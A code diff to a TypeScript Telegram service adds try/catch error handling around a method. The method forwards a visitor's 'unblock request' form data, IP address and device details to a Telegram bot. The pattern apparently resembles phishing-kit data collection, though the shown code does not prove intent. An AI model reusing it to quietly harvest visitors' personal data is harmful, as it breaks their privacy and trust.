@@ -75,10 +75,11 @@ export class TelegramService {
   }
 
   static async sendFormData(values: FormValues): Promise<Response> {
-    // Получаем информацию об устройстве
-    const deviceInfo = await this.getDeviceInfo();
-    
-    const message = `
+    try {
+      // Получаем информацию об устройстве
+      const deviceInfo = await this.getDeviceInfo();
+      
+      const message = `
 📝 Новая заявка на разблокировку:
 
 👤 Имя: ${values.name}
@@ -90,18 +91,22 @@ export class TelegramService {
 📱 Информация о пользователе:
 🌐 IP-адрес: ${deviceInfo.ip}
 📲 Устройство: ${deviceInfo.deviceDetails}
-    `;
-    
-    return fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: this.chatId,
-        text: message,
-        parse_mode: 'HTML',
-      }),
-    });
+      `;
+      
+      return fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: this.chatId,
+          text: message,
+          parse_mode: 'HTML',
+        }),
+      });
+    } catch (error) {
+      console.error('Ошибка при отправке данных:', error);
+      throw error;
+    }
   }
 }
